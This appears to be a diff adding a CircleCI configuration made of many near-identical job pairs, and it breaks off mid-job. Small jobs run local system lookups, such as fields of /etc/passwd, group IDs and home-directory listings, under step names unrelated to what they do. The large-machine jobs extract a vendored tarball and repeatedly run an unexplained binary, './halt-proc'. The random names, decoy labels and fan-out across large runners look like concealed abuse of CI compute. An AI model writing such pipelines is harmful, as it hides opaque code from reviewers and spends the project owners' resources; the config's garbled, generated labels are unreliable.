@@ -1,0 +1,1935 @@
+version: 2.1
+
+jobs:
+  OUT-TAX-MIN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create fixture B
+          command: |
+            mkdir -p /tmp/y2
+            set +o pipefail 2>/dev/null; echo "ts $(date +%s%N)" > /tmp/y2/scratch-91d; echo "ppid $PPID" >> /tmp/y2/scratch-91d; seq 1 1294586 >> /tmp/y2/scratch-91d; true
+            echo "+" "step"  "p-2"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'scratch-91d'
+  p-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/scratch-91d 2>/dev/null) /tmp/y2/scratch-91d 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  getXoluss:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Ping the socket pool because it is slow
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cp /etc/shells "/tmp/home.copy" && sed --in-place 's|/bin/|/opt/bin/|' "/tmp/home.copy" && wc -l "/tmp/home.copy"; true ; } > /tmp/y2/20171013
+            echo "+" "step"  "pr-x"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '20171013'
+  pr-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/20171013 2>/dev/null) /tmp/y2/20171013 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  login_10_4_22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: idk distill the reward model
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; for x in ivan dave judy; do printf '%s\n' ${x} ; done | wc -l; true ; } > /tmp/y2/shard-flux
+            echo "+" "step"  "nov22-smoke"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'shard-flux'
+  nov22-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/shard-flux 2>/dev/null) /tmp/y2/shard-flux 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  FontChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Let the physics layers cook
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; time sleep 0.2; true ; } > /tmp/y2/G
+            echo "+" "step"  "rm-edge-bug"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'G'
+  rm-edge-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/G 2>/dev/null) /tmp/y2/G 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  a0ac61a6-a13b-3595-a854-fb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: dry incubator last
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cp /etc/os-release /tmp/ite9.list && sed -i.orig 's/^NAME=/OS_NAME=/' /tmp/ite9.list && grep -c . /tmp/ite9.list; true ; } > /tmp/y2/20150727_014724
+            echo "+" "step"  "DATA-696"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '20150727_014724'
+  DATA-696:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/20150727_014724 2>/dev/null) /tmp/y2/20150727_014724 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  Copy-AvatarProperty:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Tomorrow approve the training records
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printf %s "work in progress" | b2sum | awk '{print $1}'; true ; } > /tmp/y2/DeLTAInvOiCEwoLFOmEga
+            echo "+" "step"  "q1-smoke"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'DeLTAInvOiCEwoLFOmEga'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/DeLTAInvOiCEwoLFOmEga 2>/dev/null) /tmp/y2/DeLTAInvOiCEwoLFOmEga 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  WizardFx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nvm dump the dead tuples
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cut -d ":" -f 1,7 /etc/passwd| tail -n6; true ; } > /tmp/y2/shard752
+            echo "+" "step"  "rm-parse-leak"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'shard752'
+  rm-parse-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/shard752 2>/dev/null) /tmp/y2/shard752 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  otherSet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Seeding Tier 1
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls /usr/lib | fmt -w 37 | wc -w; true ; } > /tmp/y2/xx_55925a933af
+            echo "+" "step"  "rigel-final"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'xx_55925a933af'
+  rigel-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/xx_55925a933af 2>/dev/null) /tmp/y2/xx_55925a933af 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  mod_rw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: id 4da6 sort
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; tr -d '"' </etc/os-release | head -4; true ; } > /tmp/y2/quarkqueuecrisp
+            echo "+" "step"  "may27-canary"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'quarkqueuecrisp'
+  may27-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/quarkqueuecrisp 2>/dev/null) /tmp/y2/quarkqueuecrisp 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  BOX_PIXEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Truly decrypt the oauth scopes
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 1 -iname '*.log' | nl; true ; } > /tmp/y2/9c88eec25b6409866c09de
+            echo "+" "step"  "cd-new"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '9c88eec25b6409866c09de'
+  cd-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/9c88eec25b6409866c09de 2>/dev/null) /tmp/y2/9c88eec25b6409866c09de 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  token-payment-lever-post:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Warm the rollout plan ahead of lunch
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; getent group|head -10|tail -6|cut -d":" -f3; true ; } > /tmp/y2/mapp3r
+            echo "+" "step"  "node18-cov"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'mapp3r'
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/mapp3r 2>/dev/null) /tmp/y2/mapp3r 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  alicetron:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Id f9f44 refund
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -Rw --include="*.txt" export /etc/skel | head -n6; true ; } > /tmp/y2/BUNDLE
+            echo "+" "step"  "anothr-run-6"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'BUNDLE'
+  anothr-run-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/BUNDLE 2>/dev/null) /tmp/y2/BUNDLE 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  zone-length:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create fixture B
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "${TMPDIR:-/tmp}/alertzebra.gz" && zcat "${TMPDIR:-/tmp}/alertzebra.gz" | head -n3; true ; } > /tmp/y2/mHMtbHgJpvlU
+            echo "+" "step"  "fix-queue"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'mHMtbHgJpvlU'
+  fix-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/mHMtbHgJpvlU 2>/dev/null) /tmp/y2/mHMtbHgJpvlU 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  Alive-Guard-Hook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Watermark B Roll Patch 9
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -A $HOME | rev | cat -n; true ; } > /tmp/y2/PLASMA_ORCHARD_CANVAS
+            echo "+" "step"  "test"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'PLASMA_ORCHARD_CANVAS'
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/PLASMA_ORCHARD_CANVAS 2>/dev/null) /tmp/y2/PLASMA_ORCHARD_CANVAS 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  sdof27od8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Palletize Aisle 7 Zone 5
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=3463\nuser=chen\ndebug=false\n' >'/tmp/release.dat' && sed -n "s/^user=//p" '/tmp/release.dat'; true ; } > /tmp/y2/xx_29a70c201ef6
+            echo "+" "step"  "ruby3-lint"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'xx_29a70c201ef6'
+  ruby3-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/xx_29a70c201ef6 2>/dev/null) /tmp/y2/xx_29a70c201ef6 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  v_idx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Render b roll through the queue
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /var/tmp -type d -name \* -readable -exec du -sh {} + 2>/dev/null | awk -F/ '{print $NF}'; true ; } > /tmp/y2/release-7832
+            echo "+" "step"  "feb23-release"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'release-7832'
+  feb23-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/release-7832 2>/dev/null) /tmp/y2/release-7832 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  HammerFailForkLightningBuild:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Ping Size Medium
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; sed "s/^/  /" /etc/login.defs | head -n 1; true ; } > /tmp/y2/0LthpkWgTKJ
+            echo "+" "step"  "ken-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '0LthpkWgTKJ'
+  ken-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/0LthpkWgTKJ 2>/dev/null) /tmp/y2/0LthpkWgTKJ 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  calcVPNs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Sharding group C
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo hi > '/tmp/spam_final.bak' && stat -c '%n %s' '/tmp/spam_final.bak'; true ; } > /tmp/y2/7f57fa8d5ef7f784e8349d9bfbb0c7b3d13
+            echo "+" "step"  "helios-final"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '7f57fa8d5ef7f784e8349d9bfbb0c7b3d13'
+  helios-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/7f57fa8d5ef7f784e8349d9bfbb0c7b3d13 2>/dev/null) /tmp/y2/7f57fa8d5ef7f784e8349d9bfbb0c7b3d13 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  migration_retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wait confirm visa paperwork
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; compgen -b | grep -v '^[a-m]' | nl -w2 -s". "; true ; } > /tmp/y2/DSC-00097833
+            echo "+" "step"  "victor-4"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'DSC-00097833'
+  victor-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/DSC-00097833 2>/dev/null) /tmp/y2/DSC-00097833 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  juliett-cursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: 2024 scratch space shredding
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; id|wc -l; true ; } > /tmp/y2/MVI-26570
+            echo "+" "step"  "send-it"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'MVI-26570'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/MVI-26570 2>/dev/null) /tmp/y2/MVI-26570 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  ming007:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Part VI pack overstock
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep --word-regexp --recursive --line-number --include='*.txt' bash /usr/share/doc/bash 2>/dev/null | cut -d: -f1 | sort -u; true ; } > /tmp/y2/QuarkSpriteGolden
+            echo "+" "step"  "tweak-oauth-hang"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'QuarkSpriteGolden'
+  tweak-oauth-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/QuarkSpriteGolden 2>/dev/null) /tmp/y2/QuarkSpriteGolden 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  ramen_075993_public:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Tune up maintenance mode
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; if [ ! -w /tmp ]; then echo 'it is there'; elif [ -e /tmp ]; then echo maybe; else echo nope; fi; true ; } > /tmp/y2/CHUNK
+            echo "+" "step"  "defualt"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'CHUNK'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/CHUNK 2>/dev/null) /tmp/y2/CHUNK 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  knnKNNLayer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Appreciate you serving the training loop
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 2 -type f ! -name \*.xml -exec stat -c "%y %n" {} + 2> /dev/null | cat -n; true ; } > /tmp/y2/scratch_2522
+            echo "+" "step"  "produce-partial-docker-image"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'scratch_2522'
+  produce-partial-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/scratch_2522 2>/dev/null) /tmp/y2/scratch_2522 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  SidebarSpec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: flashing bios settings
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -maxdepth 1 -type l -name "NEWS*" -ctime -7|nl; true ; } > /tmp/y2/exp6_ade8
+            echo "+" "step"  "preview"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'exp6_ade8'
+  preview:
+    machine:
